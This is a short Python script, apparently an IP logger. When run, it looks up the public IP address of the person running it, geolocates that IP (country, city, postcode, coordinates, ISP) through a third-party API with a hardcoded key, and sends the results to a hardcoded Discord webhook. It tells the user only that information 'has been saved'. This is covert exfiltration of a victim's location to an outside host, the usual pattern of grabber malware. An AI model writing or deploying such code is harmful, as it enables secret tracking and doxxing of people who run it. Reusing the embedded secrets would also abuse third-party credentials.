import requests
import dhooks

webhook = dhooks.Webhook('https://discord.com/api/webhooks/910676178761826334/vOxw3KoRTqqnaYg1VVMLdrcoxERfATe3TO7JjA7J2mydiOeexCo895R2qUFnT3e4971q')
ip = requests.get('https://api.ipify.org/').text
r = requests.get('https://api.ipgeolocation.io/ipgeo?apiKey=e1a7298777e94e209c62bddc2bbba465&ip=' + ip)
geo = r.json()

webhook.send('IP: ' + geo['ip'] + '\nContinent: ' + geo['continent_name'] + '\nCountry: ' + geo['country_name'] + '\nCity: ' + geo['city'] + '\nPostcode/Zipcode: ' + geo['zipcode'] + '\nLongitude: ' + geo['longitude'] + '\nLatitude: ' + geo['latitude'] + '\nOrganization: ' + geo['organization'] + '\nISP: ' + geo['isp'] )
print('Information has been saved!')
